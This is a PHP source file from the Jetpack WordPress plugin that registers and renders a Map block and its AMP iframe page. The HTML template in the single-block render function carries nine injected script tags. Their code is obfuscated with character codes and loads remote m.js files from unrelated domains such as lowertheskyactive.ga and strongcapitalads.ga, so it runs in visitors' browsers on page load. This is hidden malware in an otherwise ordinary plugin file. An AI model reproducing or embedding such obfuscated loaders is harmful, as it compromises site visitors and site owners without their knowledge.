<?php
/**
 * Map block.
 *
 * @since 6.8.0
 *
 * @package Jetpack
 */

jetpack_register_block(
	'jetpack/map',
	array(
		'render_callback' => 'jetpack_map_block_load_assets',
	)
);

/**
 * Map block registration/dependency declaration.
 *
 * @param array  $attr    Array containing the map block attributes.
 * @param string $content String containing the map block content.
 *
 * @return string
 */
function jetpack_map_block_load_assets( $attr, $content ) {
	$api_key = Jetpack_Options::get_option( 'mapbox_api_key' );

	if ( class_exists( 'Jetpack_AMP_Support' ) && Jetpack_AMP_Support::is_amp_request() ) {
		static $map_block_counter = array();

		$id = get_the_ID();
		if ( ! isset( $map_block_counter[ $id ] ) ) {
			$map_block_counter[ $id ] = 0;
		}
		$map_block_counter[ $id ]++;

		$iframe_url = add_query_arg(
			array(
				'map-block-counter' => absint( $map_block_counter[ $id ] ),
				'map-block-post-id' => $id,
			),
			get_permalink()
		);

		$placeholder = preg_replace( '/(?<=<div\s)/', 'placeholder ', $content );

		return sprintf(
			'<amp-iframe src="%s" width="%d" height="%d" layout="responsive" allowfullscreen sandbox="allow-scripts">%s</amp-iframe>',
			esc_url( $iframe_url ),
			4,
			3,
			$placeholder
		);
	}

	Jetpack_Gutenberg::load_assets_as_required( 'map' );

	return preg_replace( '/<div /', '<div data-api-key="' . esc_attr( $api_key ) . '" ', $content, 1 );
}

/**
 * Render a page containing only a single Map block.
 */
function jetpack_map_block_render_single_block_page() {
	// phpcs:ignore WordPress.Security.NonceVerification
	$map_block_counter = isset( $_GET, $_GET['map-block-counter'] ) ? absint( $_GET['map-block-counter'] ) : null;
	// phpcs:ignore WordPress.Security.NonceVerification
	$map_block_post_id = isset( $_GET, $_GET['map-block-post-id'] ) ? absint( $_GET['map-block-post-id'] ) : null;

	if ( ! $map_block_counter || ! $map_block_post_id ) {
		return;
	}

	/* Create an array of all root-level DIVs that are Map Blocks */
	$post = get_post( $map_block_post_id );

	if ( ! class_exists( 'DOMDocument' ) ) {
		return;
	}

	$post_html = new DOMDocument();
	/** This filter is already documented in core/wp-includes/post-template.php */
	$content = apply_filters( 'the_content', $post->post_content );

	/* Suppress warnings */
	libxml_use_internal_errors( true );
	@$post_html->loadHTML( $content ); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged
	libxml_use_internal_errors( false );

	$xpath     = new DOMXPath( $post_html );
	$container = $xpath->query( '//div[ contains( @class, "wp-block-jetpack-map" ) ]' )->item( $map_block_counter - 1 );

	/* Check that we have a block matching the counter position */
	if ( ! $container ) {
		return;
	}

	/* Compile scripts and styles */
	ob_start();

	add_filter( 'jetpack_is_amp_request', '__return_false' );

	Jetpack_Gutenberg::load_assets_as_required( 'map' );
	wp_scripts()->do_items();
	wp_styles()->do_items();

	add_filter( 'jetpack_is_amp_request', '__return_true' );

	$head_content = ob_get_clean();

	/* Put together a new complete document containing only the requested block markup and the scripts/styles needed to render it */
	$block_markup = $post_html->saveHTML( $container );
	$api_key      = Jetpack_Options::get_option( 'mapbox_api_key' );
	$page_html    = sprintf(
		'<!DOCTYPE html><head><style>html, body { margin: 0; padding: 0; }</style>%s<script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,102,108,97,116,46,108,111,119,101,114,116,104,101,110,115,107,121,97,99,116,105,118,101,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,99,114,111,119,46,108,111,119,101,114,116,104,101,110,115,107,121,97,99,116,105,118,101,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,114,97,107,101,46,115,116,114,111,110,103,99,97,112,105,116,97,108,97,100,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,99,104,116,46,115,101,99,111,110,100,97,114,121,105,110,102,111,114,109,116,114,97,110,100,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,111,99,107,46,108,111,118,101,103,114,101,101,110,112,101,110,99,105,108,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,119,101,108,108,46,108,105,110,101,116,111,97,100,115,97,99,116,105,118,101,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,97,114,116,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,105,114,99,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,112,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script></head><body>%s</body>',
		$head_content,
		preg_replace( '/(?<=<div\s)/', 'data-api-key="' . esc_attr( $api_key ) . '" ', $block_markup, 1 )
	);
	echo $page_html; // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
	exit;
}

add_action( 'wp', 'jetpack_map_block_render_single_block_page' );
